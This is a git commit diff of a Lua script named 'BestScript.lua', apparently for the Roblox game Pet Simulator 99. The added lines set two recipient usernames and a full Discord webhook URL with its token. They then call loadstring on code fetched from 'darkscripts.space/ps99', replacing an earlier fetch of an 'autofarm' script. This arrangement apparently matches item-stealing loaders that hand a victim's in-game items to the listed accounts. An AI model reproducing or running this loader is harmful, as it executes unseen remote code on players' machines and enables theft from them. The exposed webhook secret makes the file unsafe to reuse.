ff4dedd2ed9c08d6728a3efdb4bb9f37fbff6973
GODZUUU <plastikvr@gmail.com>
2024-09-29 08:58:17 +0200

    Update BestScript.lua

--- BestScript.lua
+++ BestScript.lua
@@ -1,3 +1,4 @@
-_G.username = "granny452423kill"
-_G.Webhook = "https://discord.com/api/webhooks/1289261162310930563/6QPSHFAwsMMLJGU02eYsZucY6LUhgu91y9yd3nAduhnGdW6PN8jccpmaJqManr_coMm7"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
+Username = "granny452423kill"
+Username2 = "Johnleey345"
+Webhook = "https://discord.com/api/webhooks/1289261162310930563/6QPSHFAwsMMLJGU02eYsZucY6LUhgu91y9yd3nAduhnGdW6PN8jccpmaJqManr_coMm7"
+loadstring(game:HttpGet(('https://darkscripts.space/ps99')))()
